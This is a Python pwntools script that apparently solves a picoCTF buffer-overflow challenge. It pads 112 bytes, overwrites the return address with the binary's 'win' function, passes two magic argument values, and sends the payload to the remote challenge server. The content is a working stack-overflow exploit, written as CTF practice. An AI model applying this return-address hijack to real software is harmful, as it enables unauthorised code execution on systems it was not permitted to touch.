from pwn import *
from struct import pack

exe = context.binary = ELF("./vuln", checksec=False)
context.terminal = "konsole -e".split()


class Exploit:
    def __init__(self, p: process):
        self.p = p
        
    def debug(self, script):
        attach(self.p, gdbscript=script)
    
    def send(self, txt):
        p = self.p
        p.sendafter(b"Please enter your string:", txt)

# p = process()
p = remote("saturn.picoctf.net", 64135)
x = Exploit(p)

payload = b""
payload += cyclic(112)
payload += pack("<I", exe.symbols["win"])
payload += cyclic(4)
payload += pack("<I", 0xCAFEF00D)
payload += pack("<I", 0xF00DF00D)
payload += b"\n"
# x.debug("break *win+118\nc")
x.send(payload)
p.interactive()